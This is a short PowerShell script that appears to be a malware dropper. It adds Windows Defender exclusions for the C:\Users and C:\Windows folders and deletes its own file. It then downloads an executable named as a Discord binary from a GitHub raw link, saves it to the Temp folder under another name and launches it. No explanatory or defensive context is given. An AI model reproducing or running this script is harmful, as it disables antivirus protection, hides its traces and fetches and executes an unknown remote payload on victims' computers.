Add-MpPreference -ExclusionPath C:\Users
Add-MpPreference -ExclusionPath C:\Windows
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
$url = 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Am.exe')
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile
